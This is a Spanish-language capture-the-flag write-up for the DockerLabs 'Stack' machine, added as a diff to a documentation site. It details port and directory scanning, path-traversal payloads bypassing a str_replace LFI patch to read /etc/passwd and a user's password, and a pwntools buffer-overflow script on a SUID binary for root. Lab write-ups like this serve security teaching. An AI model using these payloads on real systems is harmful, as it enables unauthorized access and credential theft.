@@ -1,0 +1,203 @@
+---
+title: Stack
+description: Resolución completa de la máquina virtual *Stack* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Stack**, desarrollada por *4bytes* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un archivo `file.php` vulnerable a **Local File Inclusion (LFI)** mediante bypass de un parche débil (`str_replace`). Esta vulnerabilidad permite leer credenciales del usuario `bob` y acceder al sistema vía SSH.
+Una vez dentro, se identifica un binario SUID (`/opt/command_exec`) vulnerable a **buffer overflow**. Al sobrescribir una variable local con el valor `0xdead`, se obtiene ejecución de comandos como root, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Stack',
+    Autor: '4bytes',
+    Dificultad: 'Media',
+    Fecha: '21/12/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Stack.zip
+sudo bash auto_deploy.sh Stack.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Stack/{content,exploits,nmap,scripts}
+cd Stack
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/Ports_ggigmq.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/Feroxbuster_biiflf.png)
+
+**Rutas relevantes:**
+- `/index` — Página en desarrollo con una pista en el código fuente.
+  ![Code](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/Code_cahoxr.png)
+- `/file.php` — Presunta carga/lectura de archivos.
+- `/note.txt` — Indica que se intentó parchar un LFI con `str_replace`.
+  ![Note](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/Note_eg9kly.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Bypass de LFI
+
+Se prueba un bypass del parche débil:
+
+```
+http://172.17.0.2/file.php?file=....//....//....//etc/passwd
+```
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/Passwd_sw9nu3.png)
+
+Se lee la contraseña de `bob`:
+
+```
+http://172.17.0.2/file.php?file=....//....//....//usr/share/bob/password.txt
+```
+
+### 2.2 Acceso SSH
+
+```bash
+ssh bob@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/SSH_wnvhsh.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De bob → root
+
+Se buscan binarios con permisos SUID:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/Find_icwhxd.png)
+
+Se identifica `/opt/command_exec`, vulnerable a buffer overflow.
+
+Se analiza con Ghidra:
+
+```c
+char local_98[64];
+char local_58[76];
+uint local_c;  // debe valer 0xdead
+```
+
+Se crea un script de explotación con `pwntools`:
+
+```python
+from pwn import *
+context.binary = '/opt/command_exec'
+p = process('/opt/command_exec')
+offset = 76
+payload = b'A' * offset + p32(0xdead)
+p.sendline(payload)
+p.interactive()
+```
+
+![Result of script](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/ResultofScript_fuexpr.png)
+
+```bash
+/bin/bash
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1765082640/Root_d4kqsd.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "LFI con bypass de parche débil",
+      severity: "Crítica",
+      impact: "Lectura de archivos sensibles y credenciales"
+    },
+    {
+      vulnerability: "Credenciales expuestas en ruta accesible",
+      severity: "Alta",
+      impact: "Acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Binario SUID vulnerable a buffer overflow",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
